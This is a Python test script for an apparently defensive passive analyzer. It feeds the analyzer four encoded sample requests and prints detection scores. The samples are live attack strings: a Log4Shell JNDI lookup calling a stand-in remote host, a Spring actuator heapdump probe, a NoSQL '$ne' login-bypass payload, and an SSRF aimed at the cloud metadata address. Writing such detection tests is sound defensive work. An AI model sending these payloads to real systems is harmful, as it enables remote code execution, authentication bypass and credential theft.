import asyncio
from app.modules.passive_analyzer import triage_exchange

def run_passive_test(name, exchange_dict):
    print(f"\n[+] Passive Test: {name}")
    try:
        level, reason, params, score, matched = triage_exchange(exchange_dict)
        print(f"  -> SUCCESS (Score: {score}, Level: {level}, Matched: {matched})")
    except Exception as e:
        print(f"  -> FAILED: {type(e).__name__}: {e}")

async def main():
    print("=== STARTING THE ULTIMATE SURPRISE TESTS ===")

    # 1. Log4Shell (JNDI)
    run_passive_test("Log4Shell / JNDI", {
        "url": "http://test.com", "method": "POST",
        "request_b64": "JHtqbmRpOmxkYXA6Ly9tYWxpY2lvdXMuY29tL2EvYn0=" # ${jndi:ldap://malicious.com/a/b}
    })

    # 2. Spring Boot Actuator
    run_passive_test("Spring Actuator", {
        "url": "http://test.com/actuator/heapdump", "method": "GET"
    })

    # 3. NoSQL Injection
    run_passive_test("NoSQL Injection", {
        "url": "http://test.com", "method": "POST",
        "request_b64": "eyAidXNlcm5hbWUiOiB7ICIkbmUiOiBudWxsIH0sICJwYXNzd29yZCI6IHsgIiRuZSI6IG51bGwgfSB9" # { "username": { "$ne": null }, "password": { "$ne": null } }
    })
    
    # 4. WebRTC TURN/STUN SSRF
    run_passive_test("WebRTC SSRF", {
        "url": "http://test.com", "method": "POST",
        "request_b64": "dHVybjoxNjkuMjU0LjE2OS4yNTQ6MzQ3OA==" # turn:169.254.169.254:3478
    })

if __name__ == "__main__":
    asyncio.run(main())
